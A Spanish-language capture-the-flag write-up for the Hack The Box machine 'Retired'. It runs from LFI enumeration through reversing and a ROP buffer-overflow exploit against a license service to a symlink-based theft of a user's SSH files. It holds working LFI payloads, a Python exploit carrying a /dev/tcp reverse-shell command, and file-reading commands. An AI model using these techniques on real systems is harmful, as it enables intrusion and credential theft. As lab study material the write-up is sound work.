# 10.10.11.154 - Retired
![Retired](https://user-images.githubusercontent.com/96772264/213869676-8cef5005-ac7b-45a2-9745-78ff28d10f9a.png)

------------------------
# Part 1: Enumeración
Puertos abiertos -> 22(ssh), 80(http)
```console
└─$ whatweb http://10.10.11.154/
HTTPServer[nginx], ->  RedirectLocation[/index.php?page=default.html], nginx
Bootstrap, HTML5, HTTPServer[nginx], IP[10.10.11.154], Script, Title[Agency - Start Bootstrap Theme], nginx

# Fuzzing rutas PHP
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.154/FUZZ.php
000000001:   302        0 L      0 W        0 Ch        "index"

# Fuzzing subdirectorios
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.154/FUZZ/
000000277:   403        7 L      9 W        146 Ch      "assets"
000000536:   403        7 L      9 W        146 Ch      "css"
000000939:   403        7 L      9 W        146 Ch      "js"

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.11.154/FUZZ.html
000000026:   200        188 L    824 W      11414 Ch    "default"
000000902:   200        72 L     304 W      4144 Ch     "beta"
```

La url es 10.10.11.154/index.php?page=default.html
![retired1](https://user-images.githubusercontent.com/96772264/213868928-460b7621-ca15-4788-8f68-901e55fdc29a.PNG)

----------------------------
# Part 2: LFI

```console
http://10.10.11.154/index.php?page=default.html -> default.html
http://10.10.11.154/index.php?page=default.html/../../../../../etc/passwd -> nada
http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```
Una vez tenemos como explotar el LFI podemos obtener mucha información del host.

```
# Nombre del dominio:
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/hostname |  base64 -d
retired

# Usarios
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd |  base64 -d | grep "sh" | awk '{print $1}' FS=":" | tr "\n" "," | sed "s/,/, /g"
root, sshd, vagrant, dev

# Puertos
└─$ for port in $(curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/net/tcp | base64 -d | awk '{print $2}' | awk '{print $2}' FS=":"); do echo "$((16#$port))" | short -u | tr "\n" "," | sed "s/,/, /g" ; done
80, 22, 1337

# Direcciones IP
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/net/fib_trie | base64 -d | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | tr "\n" "," | sed "s/,/, /g"
10.10.11.154, 127.0.0.1,

# Dominios
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/etc/hosts | base64 -d | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | awk '{print $2}' | grep -v "localhost" | tr "\n" "," | sed "s/,/, /g"
bullseye, retired,

# Procesos en ejecución (lo meto en un archivo porque es mucho (56 lineas))
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/sched_debug | base64 -d | grep -P "\d" | grep -E "^ S|^ I" | grep -vE "scsi|system|kworker|card|irq|dbus|rcu" | awk '{print $2 " -> " $3}' > tee processes
```

----------------------------
# Part 3: Descubriendo un binario

La página beta.html dice tal que así:
![retired2](https://user-images.githubusercontent.com/96772264/213868940-5b01c97b-03b1-40c2-a0b3-c0a8dc68c675.PNG)

```
Actualmente desarollando para EMUEMU (lo busque en google pero no hay nada). Si nos compraste una consola OSTRICH 
y quieres participar en el siguiente paso puedes activar tu licencia con la app "activate_license"
Un archivo de licencia contiene una llave de 512 bits que está en el paquete de la consola OSTRICH.
```
Generamos una llave con openssl ```openssl genrsa -out license.key 512``` y la subimos
```
/POST a /activate_license.php || datos -> name="licensefile"; filename="license.key" || contenido -> la llave
```

Nos redirige a /activate_license.php que no devuelve ningun output. Pero podemos ver dicho archivo con el LFI.
```console
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=activate_license.php | base64 -d

<?php
if(isset($_FILES['licensefile'])) {   // Si el archivo que se sube es 'licensefile'
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);  // $license = "license.key"
    $license_size = $_FILES['licensefile']['size'];	// $license_size = 512
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); // crea un socket
    if (!socket_connect($socket, '127.0.0.1', 1337)) {      // Que escucha en el localhost en el puerto 1337
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";}
    socket_write($socket, pack("N", $license_size)); // empaqueta el tamaño en un ulong 32 bits
    socket_write($socket, $license);  // escribe en el socket ese "license.key" con su tamaño
    socket_shutdown($socket); socket_close($socket);}?> // cierra el socket.
```

Es decir tenemos un socket que le pasa a un programa nuestro archivo ¿Pero a cual?. Podemos tirar de ese archivo que creamos antes con el LFI...
```console
└─$ cat proceses | grep -E "activate|license"
activate_licens -> 413

└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/413/cmdline | base64 -d
/usr/bin/activate_license1337 

└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license | base64 -d > activate_licens


└─$ chmod +x  ./activate_licens 
└─$ ./activate_licens
Error: specify port to bind to  


└─$ ./activate_licens 666
[+] starting server listening on port 666
[+] listening ...

└─$ nc localhost 666
AAAA

[+] accepted client connection from 0.0.0.0:0
[+] reading 1094795585 bytes
[+] activated license:
```
Por netcat podemos hacer que funcione mejor:
```console
└─$ python3 -c "print('A'*4 + 'A'*6)" | nc localhost 666
└─$ ./activate_licens 666
[+] starting server listening on port 666
[+] listening ...
[+] accepted client connection from 0.0.0.0:0
[+] reading 1094795585 bytes
[+] activated license: AAAAAA
```
--------------------------------
**Disclaimer**: A partir de aqui tuve que tirar del [writeup de s4vitar](https://www.youtube.com/watch?v=ys-az6SyheE) porque es un ROP muy complejo,
asi que el credito es suyo. Aunque he seguido la logica todavia no me ha funcionado.
En vez de empaquetar con pwmtools como él (p64) lo he hecho con una libreria llamada struct que es propia de python. Hace lo mismo.

----------------------------
# Part 4: Desensamblando el binario

Si abrimos el programa con ghydra (he cambiado nombres de funciones y eliminado salidas de error para hacerlo mas ligero):

```c
int main(int argc,char **argv) {
  int port; char IP_s [16]; sockaddr_in IP; socklen_t IPlen; sockaddr_in server;
  uint16_t port; int sockfd; int serverfd;    
  
  	// Le pide al usuario un puerto como argumento
  port = scanf(argv[1],&DAT_00102100,&port);  // Metemos en port el puerto (o sea argumento 1)
  printf("[+] starting server listening on port %d\n",(ulong)port);

	// Crea un socket en escucha
  server.sin_family = 2; server.sin_addr = htonl(0x7f000001); server.sin_port = htons(port);
  serverfd = socket(2,1,6);
  port = bind(serverfd,(sockaddr *)&server,0x10); port = listen(serverfd,100); puts("[+] listening ...");
  
  while( true ) {
    while( true ) {
    	sockfd = accept(serverfd,(sockaddr *)&IP,&IPlen);
    	inet_ntop(2,&IP.sin_addr,IP_s,0x10);
    	printf("[+] accepted client connection from %s:%d\n",IP_s,(ulong)IP.sin_port);
    	
		// En un proceso hijo (el padre es la conexción en sí) le pasa a "activate_license" 
		// un descriptro de fichero que almacenará el input que se le pasa por la conexión (el nc localhost 666)
		hijo = fork();
    	if (hijo == 0) break;
    	close(sockfd);}
  			close(serverfd);
  		activate_license(sockfd);
  		exit(0);}
```
Luego tenemos esa función "activate_license"
```c
void activate_license(int sockfd){
  int sqlite;
  ssize_t sVar2;
  sqlite3_stmt *stmt; sqlite3 *db;
  uint32_t msglen; char buffer [512];
  
    // Mete en "msglen" 4 bytes del input que recibe de la conexión 
  tamaño = read(sockfd,&msglen,4); msglen = ntohl(msglen);
  printf("[+] reading %d bytes\n",(ulong)msglen);  
  // 4 bytes para el tamaño -> python3 -c "print('A'*4)" | nc localhost 666 -> reading 1094795585 bytes >>> 0
x41414141 = 1094795585
 
 	// Lo segundo que le pide al usaurio es la licencia. Mete en el buffer de 512 bytes hasta cubrir el tamaño especificado en mslen
  licencia = read(sockfd,buffer,(ulong)msglen);  

  	// Lo almacena en una base de datos sqlite
  sqlite = sqlite3_open("license.sqlite",&db); 
  sqlite = sqlite3_exec(db, "CREATE TABLE IF NOT EXISTS license (id INTEGER PRIMARY KEY AUTOINCREMENT, license_
key TEXT)" ,0,0,0);
  sqlite = sqlite3_prepare_v2(db,"INSERT INTO license (license_key) VALUES (?)",0xffffffff,&stmt,0);
  sqlite = sqlite3_step(stmt); port = sqlite3_reset(stmt); port = sqlite3_finalize(stmt);
  printf("[+] activated license: %s\n",buffer); return;}
```

Pero y si lo que le metemos a buffer por sockfd es mas grande que lo especificado en mslen?
```
└─$ printf "\x00\x00\x00\x01AAAA" | nc localhost 6668
```
```console
└─$ ./activate_licens 666          
[+] reading 1 bytes
[+] activated license: A
```
Si le mandamos esto ```printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668``` 
(mete 600 A en 512 de tamaño) al final de las AAA pone bytes extraños, el proceso se ha corromprido de 
cierta manera. Pero por que no da SEGFAULT? porque es un proceso hijo

Si lo corremos con gdb en otro puerto ej:
```console
└─$ gdb ./activate_licens
gef➤  set follow-fork-mode child
gef➤  r 6667
# printf "\x00\x00\x03\x00$(python3 -c 'print("A" * 1000)')" | nc localhost 6668
# >>> SEGFAULT (mete 1000 A en 768 bytes)
```

# -------------------

Vemos primero las protecciones:
```console
└─$ file ./activate_licens 
./activate_licens: ELF 64-bit LSB pie executable, x86-64, dynamically linked, /lib64/ld-linux-x86-64.so.2

gef➤  checksec
Canary                        : ✘ -> 
NX                            : ✓ -> no se puede ejecutar shellcode en la pila
PIE                           : ✓ -> memoria aleatorizada
Fortify                       : ✘
RelRO                         : Full -> No podemos modificar la tabla GOT
```
Conseguir la libc que esta usando:
```console
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/413/maps | base64 -d  | grep "libc"
7fc8a1464000-7fc8a1489000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
└─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/lib/x86_64-linux-gnu/libc-2.31.so | base64 -d > libc-2.31.so
```
Conseguir las direcciones base (libc y el binario):
Como las direcciones cambian siemore que se reinicia la maquina con este script se pillan
```bash
base64_url="http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource="
pid=$(curl -s $base64_url/proc/sched_debug | base64 -d | grep "activate_licens" | awk '{print $3}') 
libc_memory=$(curl -s $base64_url/proc/$pid/maps | base64 -d | grep "libc" | head -n1 | awk '{print $1}' | awk '{print $1}' FS="-")
binary_memory=$(curl -s $base64_url/proc/$pid/maps | base64 -d | grep "activate_licens" | head -n1 | awk '{print $1}' | awk '{print $1}' FS="-")

echo "Direccion de memoria del binario -> 0x${binary_memory}"
echo "Direccion de memoria de libc -> 0x${libc_memory}"
```

Ver que parte del bianrio tiene permisos de escritura
```console
└─$ rabin2 -S ./activate_licens | grep "w"
19  0x00002cb8    0x8 0x00003cb8    0x8 -rw- .init_array
20  0x00002cc0    0x8 0x00003cc0    0x8 -rw- .fini_array
21  0x00002cc8  0x200 0x00003cc8  0x200 -rw- .dynamic
22  0x00002ec8  0x138 0x00003ec8  0x138 -rw- .got
23  0x00003000   0x10 0x00004000   0x10 -rw- .data
24  0x00003010    0x0 0x00004010    0x8 -rw- .bss
```

¿Cuando corrompemos la pila (sobreescribir rip)?
```console
gef➤ pattern create 1024
aaaaaaa...aaaaf
└─$ printf "\x00\x00\x03\x00aaaaaaa...aaaaf" | nc localhost 6669
# SEGFAULT
$rsp   : 0x007fffffffded8  →  "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"
$rbp   : 0x636161616161616f ("oaaaaaac"?)
$rsi   : 0x005555555592a0  →  "[+] activated license: aaaaaaaabaaaaaaacaaaaaaadaa[...]"

[+] Found at offset 520 (little-endian search) likely
```
```console
└─$ objdump -d libc-2.31.so | grep "system"    
0000000000048e50 <__libc_system@@GLIBC_PRIVATE>:
# Tambien con readelf -> readelf -s libc-2.31.so | grep "system" 
```

```console
└─$ ropper -f libc-2.31.so --search "pop rdi; ret"
0x0000000000026796: pop rdi; ret;
└─$ ropper -f libc-2.31.so --search "pop rsi; ret"
0x000000000002890f: pop rsi; ret;
└─$ ropper -f libc-2.31.so --search "mov [rdi], rsi; ret"
0x00000000000603b2: mov qword ptr [rdi], rsi; ret;

└─$ rabin2 -S ./activate_licens | grep "w"
23  0x00003000   0x10 0x00004000   0x10 -rw- .data
```


```python3
#!/usr/bin/python3
import socket
from struct import pack
import requests

cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"
libc_base = 0x7f356ace6000
binary_base = 0x5646c60f3000
writable = binary_base + 0x00004000
system = pack("<q",(libc_base + 0x00048e50))
pop_rdi = pack("<q",(libc_base + 0x0026796))
pop_rsi = pack("<q",(libc_base + 0x002890f))
mov_rdi_rsi = pack("<q",(libc_base + 0x000603b2))
payload = b'A' * 520

# Mete en writable de 8 en 8 bytes el comando
# ROP -> rdi=writable  rsi=cmd   mov [rdi <- rsi]
for i in range(0, len(cmd), 8):
    payload += pop_rdi
    payload += pack("<q",(writable + i))
    payload += pop_rsi
    payload += cmd[i:i+8].ljust(8, b"\x00")  # [0:8] [8:16] [16:24]...
    payload += mov_rdi_rsi

# system() <- rdi
payload += pop_rdi
payload += pack("<q",writable)
payload += system
with open("file.key", "wb") as f:
    f.write(payload)

file = {'licensefile':("file.key", open("file.key","rb"), 'application/x-iwork-keynote-sffkey')}
url = "http://10.10.11.154/activate_license.php"
req = requests.post(url, files=file)
```

```console
www-data@retired:/tmp$ systemctl list-timers | head -n 4
# Se ejecuta cada minuto website_backup.timer website_backup.service
# /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website
[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup
[Install]
WantedBy=multi-user.target
```

Renombrando variables el script /usr/bin/webbackup es:
```
#!/bin/bash
cd /var/www/
/usr/bin/rm -f /var/www/fecha-html.zip   # Borra /var/www/fecha-html.zip 
/usr/bin/zip --recurse-paths /var/www/fecha-html.zip /var/www/html # Comprime /var/www/html en /var/www/fecha-html.zip
KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```
www-data@retired:~/html$ ln -s -f /home/dev /var/www/html
www-data@retired:/tmp$ watch -n 1 ls /var/www/
# Se crea 2023-01-22_10-18-00-html.zip
www-data@retired:/tmp$ cp /var/www/2023-01-22_10-18-00-html.zip /tmp
www-data@retired:/tmp$ cd /tmp/
www-data@retired:/tmp$ unzip 2023-01-22_10-18-00-html.zip
www-data@retired:/tmp$ cd ./var/www/html
www-data@retired:/tmp/var/www/html$ cd dev
www-data@retired:/tmp/var/www/html/dev$ ls -la
drwx------ 2 www-data www-data 4096 Mar 11  2022 .ssh
drwx------ 2 www-data www-data 4096 Mar 11  2022 activate_license
drwx------ 3 www-data www-data 4096 Mar 11  2022 emuemu
```


